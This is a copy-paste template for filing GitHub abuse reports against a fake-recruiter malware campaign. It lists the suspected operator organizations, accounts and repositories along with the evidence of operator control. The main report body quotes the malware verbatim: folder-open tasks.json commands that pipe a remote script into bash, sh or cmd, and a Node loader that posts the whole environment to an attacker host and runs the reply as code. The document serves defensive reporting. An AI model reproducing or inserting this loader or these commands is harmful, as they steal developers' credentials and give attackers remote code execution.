# Abuse report — GitHub Trust & Safety

This case is being reported through **six separate filings** to provide visibility into the two relevant kinds of GitHub Trust & Safety action:

- **Content takedown** — disabling the malicious repository (`Malware or exploits` category). Filed *once*, against the repo you encountered.
- **Account-level reporting** — reporting the operator-controlled organizations and user accounts. Filed *once per entity* (three orgs + two users).

Both report types route to T&S; we're not assuming a specific response. Filing across both ensures the observations are visible to whichever review process is relevant.

All six filings go through the same GitHub abuse contact form at **https://github.com/contact/report-content-or-abuse**. What differentiates the filings is two fields in the form:

1. **Which URL/handle you put in the "content/account being reported" field** — a repo URL for the content takedown, an org or user URL for each account-level report.
2. **Which abuse category you select** — `Malware or exploits` for the content takedown, an account-level category (typically `Other` or the closest matching option) for the account-level reports.

(GitHub also exposes per-entity "Report" links on org and user pages — those route to the same contact form with the entity URL pre-filled, which is the easier path for filings #2–#6.)

This file is a **copy-paste template**. Before submitting, replace the placeholders below with values from this incident's [case file](./README.md) (or from your direct knowledge of the repo you were pointed at). The campaign-wide indicators (operator-controlled organization names, user accounts, C2 hostnames, etc.) are already filled in because they're the same across the cluster.

### Placeholders to fill in

Placeholders appear in the code blocks as `[descriptive label in square brackets]` — find-and-replace each one before pasting.

| Placeholder | What to put | Where to find it |
|---|---|---|
| `[reported repository URL]` | Full URL of the repository being reported, e.g. `https://github.com/<org>/<repo>` | The recruiter's link, or [the campaign-repositories catalog](../../README.md#repositories) on the top-level README |
| `[commit SHA]` | The full 40-char commit SHA you're citing as evidence | `git log -1 --format=%H` on your local clone, or the head SHA on the GitHub page |
| `[your name / handle]` | How you want the "Reported by" line to read | (yourself) |

The org and user filings (#2–#6) additionally use `[org login]` and `[user login]` — listed at the top of each of those code blocks.

> On the rendered GitHub view of this file, hover over each `text` code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version. **For each filing, copy the matching subject + body code blocks and do the placeholder fill-in before pasting.**

---

## Filing checklist

Work top-down. The first filing is the content/malware report and carries the full technical evidence; filings #2–#6 are the per-entity account-level reports.

| # | Target | Action type | URL to paste in the form's "what are you reporting" field | Abuse category to select | Easiest entry point (pre-fills the URL) | Use these code blocks |
|---|---|---|---|---|---|---|
| 1 | The repo you were pointed at | Content takedown | `[reported repository URL]` | **Malware or exploits** | Go directly to **https://github.com/contact/report-content-or-abuse** and paste the URL. (There's no convenient per-repo "Report" button; for repo reports you always use the contact form directly.) | [Subject — main](#subject--main-report) + [Body — main](#body--main-report) |
| 2 | Org `AjunaWorkHub` | Account-level report | `https://github.com/AjunaWorkHub` | Account-level (use **Other** or the closest matching option; explain in the body) | Go to **https://github.com/AjunaWorkHub** → click the **"…"** kebab menu near the top right → **"Report abuse"** — this opens the contact form with the org URL pre-filled. | [Subject — org](#subject--org-filings) + [Body — org](#body--org-filings) |
| 3 | Org `AetSoftWorkHub` | Account-level report | `https://github.com/AetSoftWorkHub` | (same as #2) | Same flow as #2, starting from **https://github.com/AetSoftWorkHub** | (same as #2) |
| 4 | Org `DLabsHungary-Hub9` | Account-level report | `https://github.com/DLabsHungary-Hub9` | (same as #2) | Same flow, starting from **https://github.com/DLabsHungary-Hub9** | (same as #2) |
| 5 | User `GitWorkHub9` | Account-level report | `https://github.com/GitWorkHub9` | Account-level (use **Other** or the closest matching option) | Go to **https://github.com/GitWorkHub9** → click **"Block or report user"** below the profile picture → **"Report abuse"** — opens the contact form with the user URL pre-filled. | [Subject — user](#subject--user-filings) + [Body — user](#body--user-filings) |
| 6 | User `GitWorkHub99` | Account-level report | `https://github.com/GitWorkHub99` | (same as #5) | Same flow as #5, starting from **https://github.com/GitWorkHub99** | (same as #5) |

If a UI label doesn't match exactly (GitHub does adjust placement), the universal fallback for *any* of these is to open **https://github.com/contact/report-content-or-abuse** manually, paste the URL from the third column, select the category from the fourth column, and paste the matching subject + body. Each filing creates a separate T&S ticket but all reference the same campaign.

---

## Which entities are filed against — and why

The five named entities in the table above (three orgs, two users) are filed against at the account level because each one shows **multiple independent signals consistent with being created specifically for this campaign**. Accounts that merely have a campaign repo on their account but otherwise show a long-standing legitimate-developer activity history are **not** filed against at the account level — those accounts may themselves be victims of compromise, and filing against them risks burdening a victim of a different attack.

The signals observed on the filed-against accounts:

- **Single-repo / single-purpose account.** The org or user hosts exactly one substantive repository (the campaign one), or hosts only campaign-shape repos with no unrelated legitimate activity.
- **Recent creation, clustered in time.** The account was created within weeks of campaign activity, sometimes the same day as a sibling operator account, sometimes with adjacent GitHub numeric IDs (implying batch creation by the same operator).
- **No legitimate activity surface.** No prior unrelated repos, no PR history elsewhere, no contributions to open-source projects, no public profile content suggesting real developer use. (Caveat: this signal flips for credibility-farming accounts — see `GitWorkHub99` below — where the operator has *manufactured* an activity surface from clones of well-known OSS projects.)
- **Naming-pattern match across entities.** A naming convention shared across multiple of the campaign's identities (`*WorkHub*`, `Hub9`, `Hub99`, numeric-`9`-suffix repo naming) suggests a single operator running multiple personas.
- **Commit-author email convention.** Use of the Gmail `+N` alias convention (`foo+1@gmail.com`, `foo+2@gmail.com`) is a strong tell of multiple operator personas off a single inbox.
- **Verifiable malicious content.** The hosted repository carries the malware-loader code analyzed in [the main case file](./README.md), independently verifiable via GitHub code search.

Applied to the entities:

| Entity | Signals observed |
|---|---|
| `AjunaWorkHub` (org, id 276264331) | Single repo (`AjunaVerse_MVP`); created 2026-04-27; no other org activity; adjacent id and same-day creation as `AetSoftWorkHub`; `*WorkHub*` naming pattern; hosts verified malware-loader code. |
| `AetSoftWorkHub` (org, id 276275397) | Single repo (`AetSoft_MVP`); created 2026-04-27 (same day as AjunaWorkHub); adjacent id; no other org activity; `*WorkHub*` naming pattern; hosts the bit-identical `.vscode/tasks.json` blob as AjunaVerse_MVP (proving operator linkage). |
| `DLabsHungary-Hub9` (org) | Single substantive repo carrying the loader; `Hub9` suffix matches the `GitWorkHub9` username (single-operator naming convention); fake-business framing typical of fake-recruiter front orgs. |
| `GitWorkHub9` (user, id 272514006) | Sole committer to `AjunaVerse_MVP`; commit-author email `fatihafariya8+2@gmail.com` (Gmail `+N` alias — implies parallel operator personas); `*WorkHub*` + numeric-suffix naming pattern shared with three operator orgs. |
| `GitWorkHub99` (user, id 213663943) | `*WorkHub*` + double-9 numeric-suffix naming pattern matches the operator convention; hosts a sibling campaign repo (`AetSoftVerse`); the ~20 clones of well-known open-source projects (`llama.cpp`, `prettier`, `angular-cli`, `nuxt.com`, `Xray-core`, etc.) match the publicly-documented **"credibility farming"** TTP used by fake-recruiter operators to give the GitHub profile the visual ballast of a legitimate developer. |

### Earlier-generation sibling repos

The earlier-generation repos catalogued in the main case file (e.g. `prahaladbelavadi/CoinLocatorDemo`, `sky-cook/tokentradingdapp`, `WilliamSuhosky/Property-Voting-DApp`, `artemus-jarrett/blockchain-voting-system`, `Andrii-888/0gRollplay`, etc.) carry the loader code but their account histories are mixed. Some of these accounts have prior unrelated activity that's consistent with a legitimate developer whose account was later compromised and repurposed. The main report (filing #1) lists them as content for takedown; they are **not** included in the per-entity account-level filings, since the available signals on those accounts are insufficient to distinguish "operator-controlled" from "compromised legitimate."

If, while filing, you find clear evidence that one of those accounts *is* operator-controlled (the only activity is the campaign repo, naming pattern matches, no legitimate-developer history), it can be added to the user-filings list using the user-filing template below.

---

## Subject — main report

```text
Coordinated multi-org developer-targeting malware campaign on GitHub — at least 15 repositories across the AjunaWorkHub, AetSoftWorkHub, and DLabsHungary-Hub9 organizations (plus individual accounts) deliver RCE and credential-theft payloads to developers via fake recruiting outreach
```

## Body — main report

```text
SUMMARY

This is a campaign-level report covering an active, operationally-coordinated developer-targeting malware operation distributing remote-code-execution and credential-theft payloads via at least 15 GitHub repositories spread across multiple organizations and individual accounts. The repositories share an identical loader idiom and have been enumerated via GitHub code search on the distinctive strings "verify(setApiKey(process.env.AUTH_API))" and 'new Function("require", response.data)'. The TTPs match the publicly-documented "Contagious Interview" cluster (fake-recruiter cold outreach -> instruction to clone and run a "Web3 MVP" repository ahead of an interview -> compromise on first run).

Reported on behalf of: [reported repository URL] (one of the cluster's known repositories).

This report is paired with five additional per-entity reports (against three organizations: AjunaWorkHub, AetSoftWorkHub, DLabsHungary-Hub9; and two user accounts: GitWorkHub9, GitWorkHub99). They reference the same campaign and may be useful to cross-reference.


FULL CASE FILE

A public, regularly-maintained case file for this campaign -- including the annotated technical analysis, machine-readable IOCs (CSV/JSON), and detection rules (YARA, Sigma, grep) -- is at:

  https://github.com/bryanchriswhite/dev-trap-dossiers


KNOWN CAMPAIGN REPOSITORIES

The repositories are listed below in two groups based on the observed profile of the owning account. All repos carry verified malware-loader code.

Current generation (loader at server/routes/api/auth.js) -- repos on accounts where multiple signals indicate operator-control:

- https://github.com/AjunaWorkHub/AjunaVerse_MVP   (org AjunaWorkHub, id 276264331; multi-signal operator-control -- see "Operator-control signals" section below)
- https://github.com/AetSoftWorkHub/AetSoft_MVP    (org AetSoftWorkHub, id 276275397; multi-signal operator-control; bit-identical .vscode/tasks.json blob with AjunaVerse_MVP)
- https://github.com/DLabsHungary-Hub9/DLabs-Platform-MVP2  (org DLabsHungary-Hub9; single-repo single-purpose org, "Hub9" naming match)
- https://github.com/roamanbuild/OnyxVerse         (user roamanbuild; account hosts only campaign-shape repos -- OnyxVerse, ACN-Verse, Japanese-Royal, plus *-demo9 variants matching the operator's numeric-9-suffix persona convention; no legitimate-developer activity)

Current generation -- repos on accounts where the activity profile is consistent with account compromise (long-standing legitimate-developer histories alongside the campaign repo). These accounts may themselves be victims of a separate attack:

- https://github.com/khaleb-dev/jackpot     (account khaleb-dev has ~55 repos over 5+ years across PHP/Java/Vue/Dart -- consistent with a real developer's portfolio)
- https://github.com/rony1235/Jp-Soccer     (account rony1235 exists since 2017 with ~11 mostly-low-activity repos; three campaign-shape repos added in April-May 2026 -- recent-compromise pattern)
- https://github.com/mspkteam/williampotter (account mspkteam hosts a mix of older legitimate-looking repos (fitnesssworldadminpanel, ETC-Coporative-code, specialized_medical) and the campaign one)

Earlier generation (loader at app/controllers/frontController.js -- same loader code, different scaffold). Accounts here generally show mixed activity profiles -- some consistent with account compromise, others not investigated in depth:

- https://github.com/Andrii-888/0gRollplay
- https://github.com/prahaladbelavadi/CoinLocatorDemo
- https://github.com/sky-cook/tokentradingdapp
- https://github.com/WilliamSuhosky/Property-Voting-DApp
- https://github.com/artemus-jarrett/blockchain-voting-system
- https://github.com/TechByteX/NitroGem    (owning account not investigated in depth)
- https://github.com/jamesm-dev/NitroGem   (owning account not investigated in depth)
- https://github.com/dappfusion/defi-real-estate    (owning account not investigated in depth)
- https://github.com/InvescoHub/defi-real-estate    (owning account not investigated in depth)


OPERATOR-CONTROL SIGNALS -- highest-confidence operator-controlled identities

The following identities show multiple independent signals consistent with being operator-created. They are also the subjects of the per-entity reports paired with this filing:

- Org: AjunaWorkHub (GitHub id 276264331, created 2026-04-27)
- Org: AetSoftWorkHub (GitHub id 276275397, created 2026-04-27 -- adjacent ID, same day, bit-identical .vscode/tasks.json)
- Org: DLabsHungary-Hub9
- User: GitWorkHub9 (id 272514006) -- sole committer to AjunaWorkHub/AjunaVerse_MVP, commit-author email fatihafariya8+2@gmail.com (Gmail "+N" alias convention implies parallel personas)
- User: GitWorkHub99 (id 213663943) -- approximately 20 "credibility farming" clones of widely-used open-source projects (llama.cpp, prettier, angular-cli, nuxt.com, Xray-core, etc.) plus a sibling campaign repo "AetSoftVerse"

Additional account showing the same signal pattern (not separately filed in the paired per-entity reports below):

- User: roamanbuild -- account hosts only campaign-shape repositories (OnyxVerse, ACN-Verse, Japanese-Royal, and *-demo9 variants matching the operator's numeric-9-suffix persona convention seen in GitWorkHub9, GitWorkHub99, and DLabsHungary-Hub9). No legitimate-developer activity. All repos created within a one-week window in May 2026.


TECHNICAL MECHANISM (observed in [reported repository URL] at commit [commit SHA]; the same loader pattern is present in every current-generation repo listed above)

The repositories carry three INDEPENDENT code-execution vectors. Any one of them is sufficient to fully compromise a developer's workstation. They are redundant by design so that even if one is neutralized the others still fire.

(1) VS Code tasks.json auto-run on folder open.
    File: [reported repository URL]/blob/[commit SHA]/.vscode/tasks.json
    Campaign IOC: the same .vscode/tasks.json blob (git blob SHA 998c34f02d94169a546b4c36123d552dd14f985b) appears BIT-IDENTICAL in BOTH AjunaWorkHub/AjunaVerse_MVP AND AetSoftWorkHub/AetSoft_MVP, proving cross-org operator coordination.
    Defines a task with "runOn": "folderOpen" and these per-OS commands:
      osx:     curl -L 'https://vscode-settings-0506.vercel.app/api/settings/mac' | bash
      linux:   wget -qO- 'https://vscode-settings-0506.vercel.app/api/settings/linux' | sh
      windows: curl --ssl-no-revoke -L https://vscode-settings-0506.vercel.app/api/settings/windows | cmd
    All output is suppressed ("reveal": "silent", "echo": false, "focus": false, "panel": "new", "close": true). The malicious lines are also padded with ~200 trailing spaces so the commands sit far off the right edge of a single line in any non-wrapping editor -- deliberate hide-in-plain-sight obfuscation.

(2) package.json "prepare" lifecycle hook.
    File: [reported repository URL]/blob/[commit SHA]/package.json
    Sets "prepare": "node server/server.js", which causes the in-repo Express server to launch during ordinary "npm install" (prepare is less notorious than postinstall and tends to escape security review). Additionally, all of start, build, test, and eject pipe "node server/server.js" into "react-scripts", so any normal "run the project" command also launches the malicious server.

(3) Server boot-time process.env exfiltration + arbitrary Node RCE.
    Files: [reported repository URL]/blob/[commit SHA]/server/routes/api/auth.js and [reported repository URL]/blob/[commit SHA]/server/controllers/auth.js
    On module load, the code POSTs { ...process.env } to a base64-obfuscated URL committed in .env as
      AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=
    which decodes to https://ip-core-api-one.vercel.app/api, and then executes the response body as JS via "new Function('require', response.data)(require)". The injected "require" gives the attacker access to fs, child_process, etc. -- full arbitrary Node RCE running as the developer's user. The POST body is the developer's entire shell environment (any AWS_*, GITHUB_TOKEN, NPM_TOKEN, OPENAI_API_KEY, ANTHROPIC_API_KEY, etc. they have exported).
    Verbatim primitive:
        const setApiKey = (s) => atob(s);
        const verify = (api) =>
          axios.post(api, { ...process.env }, { headers: { "x-app-request": "ip-check" } });
        // at module top level:
        verify(setApiKey(process.env.AUTH_API))
          .then((response) => {
            const executor = new Function("require", response.data);
            executor(require);
          });
    The wrapper names "setApiKey" and "verify" are semantic misdirection -- there is no API key and no verification. The accompanying console log "Aborting mempool scan due to failed API verification." is also misdirection: there is no mempool scan anywhere in the codebase.


ACCEPTABLE USE POLICY OBSERVATIONS

The repositories appear to violate GitHub's Acceptable Use Policies (https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) on several axes:

- the prohibition on content that "directly supports unlawful active attacks or malware campaigns that are causing technical harms,"
- the prohibitions on phishing and social engineering, and
- the prohibition on malware delivery.

Intent (rather than accidental inclusion) is suggested by: the base64 obfuscation of the C2 URL in the committed .env, the whitespace-padding obfuscation of the malicious commands in .vscode/tasks.json, the semantic misdirection in the loader's wrapper-function names ("setApiKey", "verify", "validateApiKey"), and the misleading console log strings ("Aborting mempool scan...") accompanying code that performs neither mempool scanning nor API verification.


CAMPAIGN-WIDE INDICATORS (may be useful for future-iteration detection)

- Distinctive code strings: 'verify(setApiKey(process.env.AUTH_API))', 'new Function("require", response.data)'
- Outbound HTTP request header (sent from victim Node process to C2): 'x-app-request: ip-check'
- Config pattern in .vscode/tasks.json: '"runOn": "folderOpen"' combined with suppressed-output presentation and a piped curl/wget shell payload
- Lure naming patterns: '*WorkHub*', 'Hub9', 'Hub99' (operator account/org names); '*Verse', '*-MVP', '*-demo9' (lure repo names)
- C2 hostname patterns: 'vscode-settings-*.vercel.app' (shell-payload distribution), 'ip-core-api-*.vercel.app' (Node-loader exfil + RCE)
- Committed .env values matching: 'AUTH_API=aHR0c...' (base64-encoded HTTP/HTTPS URL committed under a benign-sounding key)


CORROBORATING THIRD-PARTY DOCUMENTATION

The campaign is documented by at least six independent researchers:

- defdone/rtidx-evidence -- reports/amonixplay-evidence-report.md (analysis of an earlier sibling)
- oliver-zehentleitner/technopathy
- reymom/portfolio-site -- content/security/2026-04-15-supply-chain-attack.mdx
- nickgallick/perlantir-fleet -- references the campaign in a supply-chain-audit skill
- S0AndS0/S0AndS0.github.io -- misc/_scammers/2026-04-10_Larry-Bogie-of-BitAngels-Investment-Group.md
- jamesm-dev/NitroGem -- SECURITY_FINDINGS.md (captured loader file with annotations)


REPORTED BY

[your name / handle]
```

---

## Subject — org filings

Use the same subject for each of filings #2, #3, #4. Replace `[org login]` with the org login (`AjunaWorkHub`, `AetSoftWorkHub`, or `DLabsHungary-Hub9`).

```text
Organization [org login] — operator-control signals observed in connection with an active multi-org developer-targeting malware campaign (Contagious Interview TTP cluster)
```

## Body — org filings

The same body works for each org filing. Before submitting, replace `[org login]` with the specific org login — the entity-specific signals for each candidate are listed at the bottom of the body so the analyst sees them directly.

```text
SUMMARY

The GitHub organization [org login] shows multiple independent signals consistent with being operator-controlled in an active multi-org developer-targeting malware campaign matching the publicly-documented "Contagious Interview" TTP cluster (fake-recruiter cold outreach -> instruction to clone and run a "Web3 MVP" repository ahead of an interview -> compromise on first run).

A campaign-level report covering the full technical mechanism and the ~15 affected repositories has been filed separately via https://github.com/contact/report-content-or-abuse with the subject:
  "Coordinated multi-org developer-targeting malware campaign on GitHub -- at least 15 repositories across the AjunaWorkHub, AetSoftWorkHub, and DLabsHungary-Hub9 organizations (plus individual accounts) deliver RCE and credential-theft payloads to developers via fake recruiting outreach"
The technical observations are not repeated here; please cross-reference.

This filing is one of three per-org filings (against AjunaWorkHub, AetSoftWorkHub, DLabsHungary-Hub9) plus two per-user filings (against GitWorkHub9, GitWorkHub99). Together with the main campaign report, six filings cover the cluster.

Public case file (technical analysis, IOCs, detection rules):
  https://github.com/bryanchriswhite/dev-trap-dossiers


OBSERVED SIGNALS

Multiple independent signals on this org are consistent with operator-creation rather than a legitimate organization whose repos have been compromised:

- Hosts exactly one substantive public repository, which is part of the campaign and carries verifiable malware-loader code (analyzed in the main campaign report).
- Created recently and clustered in time with sibling orgs showing the same pattern:
    - AjunaWorkHub:  GitHub id 276264331, created 2026-04-27
    - AetSoftWorkHub: GitHub id 276275397, created 2026-04-27 (same day, ADJACENT id -- consistent with batch creation by a single operator)
    - DLabsHungary-Hub9
- No org-level activity (members, teams, contributions to external repos, etc.) outside the campaign repository.
- Naming pattern shared across the campaign's identities: the convention "<X>WorkHub" appears in AjunaWorkHub, AetSoftWorkHub, and the operator user account GitWorkHub9; the "Hub9" suffix appears in DLabsHungary-Hub9 and matches the username GitWorkHub9.
- The bit-identical .vscode/tasks.json blob (git blob SHA 998c34f02d94169a546b4c36123d552dd14f985b) appears in BOTH AjunaWorkHub/AjunaVerse_MVP AND AetSoftWorkHub/AetSoft_MVP, indicating cross-org operator coordination.


REPORTED BY

[your name / handle]
```

---

## Subject — user filings

Use the same subject for each of filings #5 and #6. Replace `[user login]` with the username (`GitWorkHub9` or `GitWorkHub99`).

```text
User [user login] — operator-control signals observed in connection with an active multi-org developer-targeting malware campaign (Contagious Interview TTP cluster)
```

## Body — user filings

The same body works for both user filings. Before submitting, replace `[user login]` with the specific username; the entity-specific signals for both candidates are listed at the bottom so the analyst sees the rationale directly.

```text
SUMMARY

The GitHub user account [user login] shows multiple independent signals consistent with being operator-controlled in an active multi-org developer-targeting malware campaign matching the publicly-documented "Contagious Interview" TTP cluster (fake-recruiter cold outreach -> instruction to clone and run a "Web3 MVP" repository ahead of an interview -> compromise on first run).

A campaign-level report covering the full technical mechanism and the ~15 affected repositories has been filed separately via https://github.com/contact/report-content-or-abuse with the subject:
  "Coordinated multi-org developer-targeting malware campaign on GitHub -- at least 15 repositories across the AjunaWorkHub, AetSoftWorkHub, and DLabsHungary-Hub9 organizations (plus individual accounts) deliver RCE and credential-theft payloads to developers via fake recruiting outreach"
The technical observations are not repeated here; please cross-reference.

This filing is one of two per-user filings (against GitWorkHub9 and GitWorkHub99) plus three per-org filings (against AjunaWorkHub, AetSoftWorkHub, DLabsHungary-Hub9). Together with the main campaign report, six filings cover the cluster.

Public case file (technical analysis, IOCs, detection rules):
  https://github.com/bryanchriswhite/dev-trap-dossiers


OBSERVED SIGNALS

Multiple independent signals on this account are consistent with operator-creation rather than a legitimate developer's account that has been compromised:

- Naming pattern: "GitWorkHub" + numeric suffix matches a convention used across the campaign's other identities including the orgs AjunaWorkHub, AetSoftWorkHub, and DLabsHungary-Hub9 (the "Hub9" suffix). Multiple personas sharing a naming convention is consistent with a single operator running multiple identities.
- Account activity centers on the campaign's repositories rather than independent development.

For GitWorkHub9 (GitHub id 272514006) specifically:
- Sole committer to AjunaWorkHub/AjunaVerse_MVP (a campaign repo).
- Commit-author email "fatihafariya8+2@gmail.com" uses the Gmail "+N" alias convention. The "+2" suffix is consistent with operator persona-numbering and implies parallel personas at +1, +3, and beyond -- a strong fingerprint of multi-persona operator activity off a single inbox.

For GitWorkHub99 (GitHub id 213663943) specifically:
- "GitWorkHub" + double-9 numeric-suffix naming matches the operator convention (parallels GitWorkHub9).
- Hosts a sibling campaign repository "AetSoftVerse" carrying the same loader code.
- Profile shows approximately 20 clones/forks of widely-used open-source projects (llama.cpp, prettier, angular-cli, nuxt.com, Xray-core, refit, mosaic, tinygrad, language-tools, and others) with minimal substantive activity per repo. This matches the publicly-documented "credibility farming" TTP -- accumulating clones of high-profile projects to give a GitHub profile the visual ballast of a legitimate developer's presence ahead of a fake-recruiter pitch.


REPORTED BY

[your name / handle]
```

---

## Supporting artifacts (for your reference; do not paste these into any filing)

- Full technical analysis: [`README.md`](./README.md)
- IOCs in machine-readable form: [`iocs.csv`](./iocs.csv), [`iocs.json`](./iocs.json)
- Detection rules: [`detection-rules.md`](./detection-rules.md)
- Companion abuse report for the Vercel-hosted C2: [`abuse-report-vercel.md`](./abuse-report-vercel.md)
